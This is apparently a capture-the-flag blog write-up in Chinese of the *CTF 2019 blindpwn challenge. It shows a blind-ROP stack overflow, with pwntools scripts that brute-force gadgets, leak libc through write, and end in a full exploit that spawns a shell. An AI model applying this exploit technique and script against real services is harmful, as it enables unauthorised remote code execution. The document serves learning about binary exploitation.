---
title: Starctf2019_Blindpwn
date: 2019-04-29 10:51:58
tags:
---
Blindpwn ...不能想当然...
<!--more-->
# start
[binary][1]


之前在[ctfwiki][0]上看到过
上面流程介绍的比较清楚了...

# First
题目给了信息
```s
checksec:
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)

file libc:
libc-2.23.so: ELF 64-bit LSB shared object,  
x86-64, version 1 (GNU/Linux), dynamically  
linked, interpreter /lib64/ld-linux-x86-64.so.2,    
BuildID[sha1]=b5381a457906d279073822a5ceb2
```
发现是x64没有`canary`&`pie`估计是简单的栈溢出所以先确定溢出长度
```python
from pwn import *
context.log_level='debug'
#p=process('./')
for x in range(0x0,0x100):
	p=remote("34.92.37.22",10000)
	p.sendafter("!\n","A"*n)
	p.interactive()
```

当覆盖掉了返回地址时就会出现奇怪的东西...从而确定长度==0x28
# 寻找pop rdi,ret
这个`gadget`比较关键.
我尝试编译了一个差不多的`binary`
```python
#include<stdio.h>
void vul()
{
	char buf[0x20];
	puts("nier");
	read(0,buf,0x100);
	puts("good bye");	
}
int main()
{
	setvbuf(stdin,0,2,0);
	setvbuf(stdout,0,2,0);
	vul();
}
```
编译命令
`gcc main.c -o main -fno-stack-protector`
反编译后发现通用`gadget`位置在`0x00000000040071E`
而且顺序从低地址`0x000000000400000`开始是
```s
一些常量
.init段
.plt
.plt.got
code段
    start
    deregister_tm_clones
    register_tm_clones
    __do_global_dtors_aux
    frame_dummy
    vul
    main
    __libc_csu_ini*******
     __libc_csu_fini
     ...
```
我们的通用`gadget`是
```arm
.text:000000000040071A 5B                                      pop     rbx
.text:000000000040071B 5D                                      pop     rbp
.text:000000000040071C 41 5C                                   pop     r12
.text:000000000040071E 41 5D                                   pop     r13
.text:0000000000400720 41 5E                                   pop     r14
.text:0000000000400722 41 5F                                   pop     r15
.text:0000000000400724 C3                                      retn
```
所以我们从`0x000000000400000+0x600`开始逐字节爆破`retn`这个`gadget`
将上一步得出的结果地址`-1,-2`测试是否是`pop ret`
将上一步得出的结果地址`-3,-4`测试是否是`pop pop ret`
....
直到得到的结果只有一个那么那个`gadget-1`应该就是我们要找的`pop rdi ret`
如果找不到换个区域找...

# 寻找leak
对于有输出的程序没开pie的程序我们可以利用其输出函数`dump`更多内存.
常用的有啥
```arm
puts
printf
write
...
```
* `puts`和`printf`都可以通过`pop rdi ret `来设置参数
* `write `可以同 `pop rdi ret pop rsi pop r15 ret`来设置参数一般`rdx`只要不是运气太差就不会是`0`
* plt地址以0xn0结尾所以只要爆破`0x000000000400000+0x300+0x10*n`就可以了


一开始想当然以为是`puts`爆到怀疑人生....过了2个多小时吃了个饭想好像我找`pop rdi`的时候有爆出一堆东西...复现了一下发现爆出了0x100字节...然后就想到了`read`的`rdx`可以被`write`用上了....于是才想到`write`
...有了`write`就可以直接`dump`内存然后`leak libc`and `get shell`

# exp
```python
from pwn import *
context.log_level='debug'
#p=process('./')
start=0x400570
got=0x400520
rdi=0x400784-1
rsi=rdi-2
for x in range(0x0,1):
	p=remote("34.92.37.22",10000)
	p.sendafter("!\n","A"*0x28+p64(rdi)+p64(1)+p64(rsi)+p64(0x601018)+p64(0)+p64(got)+p64(start)[:-1])
	base=u64(p.read(8))-(0x0f72b0)
	log.info(hex(base))
	p.sendafter("!\n","A"*0x28+p64(rdi)+p64(0x18cd57+base)+p64(base+0x045390))
	p.interactive()
```
# 总结
之前看wiki上的以为很难见 其实挺有趣的...注意write...
不要想当然认为有logo用的就是puts....

[0]:https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#brop
[1]:https://github.com/n132/Watermalon/tree/master/Starctf_2019